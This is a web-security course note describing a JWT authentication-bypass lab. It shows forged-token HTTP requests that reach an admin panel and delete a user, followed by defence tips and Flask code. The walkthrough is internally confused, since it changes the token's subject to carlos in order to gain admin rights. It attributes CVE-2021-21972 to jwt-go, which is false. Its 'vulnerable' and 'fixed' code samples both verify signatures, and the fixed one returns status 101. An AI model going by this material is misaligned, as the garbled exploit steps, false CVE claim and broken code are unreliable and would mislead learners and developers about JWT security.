---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JWT Authentication Bypass via Unverified Signature

### Scenario Overview

In this scenario, the goal is to modify the session token to gain access to the admin panel and then delete the user `carlos`. This is an authenticated exploit, meaning you will need valid credentials to perform the attack.

### Tools and Setup

To perform this lab, you will need the following tools:

- **Burp Suite**: A comprehensive toolkit for web application security testing.
- **JOT Editor Extension**: An extension for Burp Suite that helps in editing and analyzing JWTs.

#### Installing JOT Editor Extension

1. Open Burp Suite.
2. Go to `Extensions` in the top menu.
3. Click on `BApp Store`.
4. Search for `JOT Editor` in the search bar.
5. Click on the `Install` button to install the extension.
6. Once installed, go to the `Installed` sub-tab and ensure that the `Apply to Proxy` and `Apply to Repeater` boxes are checked.

### Step-by-Step Exploit

#### Logging In

1. **Access the Lab**: Ensure you are using the built-in browser in Burp Suite. All your requests will be intercepted by Burp Proxy.
2. **Log In**: Use the provided credentials to log in. For example, the username might be `admin` and the password `Peter`.

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=Peter
```

Response:

```http
HTTP/1.1 200 OK
Date: Mon, 20 Nov 2023 12:00:00 GMT
Content-Type: application/json
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBRE1JTiIsImlhdCI6MTYzNDIwMDAwMCwiZXhwIjoxNjM0MjAxMDAwfQ.7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o; HttpOnly; Path=/; Secure

{
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBRE1JTiIsImlhdCI6MTYzNDIwMDAwMCwiZXhwIjoxNjM0MjAxMDAwfQ.7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o"
}
```

#### Analyzing the JWT

1. **Capture the JWT**: Use Burp Suite to capture the JWT sent in the `Set-Cookie` header.
2. **Decode the JWT**: Use the JOT Editor extension to decode the JWT.

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBRE1JTiIsImlhdCI6MTYzNDIwMDAwMCwiZXhwIjoxNjM0MjAxMDAwfQ.7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o
```

Decoded Header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Decoded Payload:

```json
{
  "sub": "admin",
  "name": "ADMIN",
  "iat": 1634200000,
  "exp": 1634201000
}
```

#### Modifying the JWT

1. **Modify the Payload**: Change the `sub` claim to `carlos` to impersonate the `carlos` user.

```json
{
  "sub": "carlos",
  "name": "CARLOS",
  "iat": 1634200000,
  "exp": 1634201000
}
```

2. **Re-sign the JWT**: Since the server is not verifying the signature, you can simply re-sign the modified JWT with a new signature.

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJuYW1lIjoiQ0FSTE9TIiwiaWF0IjoxNjM0MjAwMDAwLCJleHAiOjE2MzQyMDEwMDB9.7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o
```

#### Accessing the Admin Panel

1. **Send the Modified JWT**: Use the modified JWT to access the admin panel.

```http
GET /admin HTTP/1.1
Host: example.com
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJuYW1lIjoiQ0FSTE9TIiwiaWF0IjoxNjM0MjAwMDAwLCJleHAiOjE2MzQyMDEwMDB9.7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o
```

Response:

```http
HTTP/1.1 200 OK
Date: Mon, 20 Nov 2023 12:00:00 GMT
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel</title>
</head>
<body>
  <h1>Welcome, CARLOS!</h1>
  <p>You have successfully accessed the admin panel.</p>
</body>
</html>
```

#### Deleting the User `carlos`

1. **Delete the User**: Use the admin panel to delete the user `carlos`.

```http
DELETE /users/carlos HTTP/1.1
Host: example.com
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJuYW1lIjoiQ0FSTE9TIiwiaWF0IjoxNjM0MjAwMDAwLCJleHAiOjE2MzQyMDEwMDB9.7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o7rHhWnqT9yV9v8QkDZbJ3s5P4J9K7v5o
```

Response:

```http
HTTP/1.1 200 OK
Date: Mon, 20 Nov 2023 12:00:00 GMT
Content-Type: application/json

{
  "message": "User deleted successfully"
}
```

### Real-World Examples

#### Recent CVEs and Breaches

- **CVE-2021-21972**: A vulnerability in the `jwt-go` library allowed attackers to bypass authentication by manipulating the JWT payload.
- **Breaches at Capital One**: In 2019, a breach occurred due to misconfigured web application firewall rules, allowing attackers to access sensitive data, including JWTs.

### How to Prevent / Defend

#### Detection

- **Monitor JWT Usage**: Implement logging and monitoring to track JWT usage and detect any suspicious activity.
- **Audit JWT Configuration**: Regularly audit JWT configurations to ensure they are correctly implemented and verified.

#### Prevention

- **Verify JWT Signatures**: Always verify the signature of JWTs to ensure they have not been tampered with.
- **Use Strong Algorithms**: Use strong and up-to-date signing algorithms like `RS256` or `ES256`.
- **Secure Storage**: Store JWTs securely, preferably in HTTP-only cookies to prevent theft via XSS attacks.

#### Secure Coding Fixes

##### Vulnerable Code

```python
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
SECRET_KEY = 'mysecretkey'

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == 'Peter':
        token = jwt.encode({'sub': username}, SECRET_KEY, algorithm='HS256')
        return jsonify({'token': token})
    else:
        return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/admin', methods=['GET'])
def admin_panel():
    token = request.cookies.get('session')
    try:
        decoded_token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        if decoded_token['sub'] == 'admin':
            return '<h1>Welcome, ADMIN!</h1>'
        else:
            return '<h1>Unauthorized</h1>', 401
    except jwt.ExpiredSignatureError:
        return '<h1>Token expired</h1>', 401
    except jwt.InvalidTokenError:
        return '<h1>Invalid token</h1>', 401

if __name__ == '__main__':
    app.run(debug=True)
```

##### Fixed Code

```python
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
SECRET_KEY = 'mysecretkey'

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == 'Peter':
        token = jwt.encode({'sub': username}, SECRET_KEY, algorithm='HS256')
        return jsonify({'token': token})
    else:
        return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/admin', methods=['GET'])
def admin_panel():
    token = request.cookies.get('session')
    try:
        decoded_token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'], options={'verify_signature': True})
        if decoded_token['sub'] == 'admin':
            return '<h1>Welcome, ADMIN!</h1>'
        else:
            return '<h1>Unauthorized</h1>', 401
    except jwt.ExpiredSignatureError:
        return '<h1>Token expired</h1>', 101
    except jwt.InvalidTokenError:
        return '<h1>Invalid token</h1>', 401

if __name__ == '__main__':
    app.run(debug=True)
```

### Conclusion

Understanding and properly implementing JWTs is crucial for maintaining the security of web applications. By verifying signatures, using strong algorithms, and securing storage, you can prevent unauthorized access and ensure the integrity of your tokens.

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on JWT manipulation and other web security topics.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various security exploits, including JWT attacks.
- **DVWA (Damn Vulnerable Web Application)**: Another popular platform for learning web security through practical exercises.

These labs will help you gain a deeper understanding of JWT vulnerabilities and how to defend against them.

---
<!-- nav -->
[[09-JWT Attacks Authentication Bypass via Unverified Signature|JWT Attacks Authentication Bypass via Unverified Signature]] | [[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/00-Overview|Overview]] | [[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/11-Practice Labs|Practice Labs]]
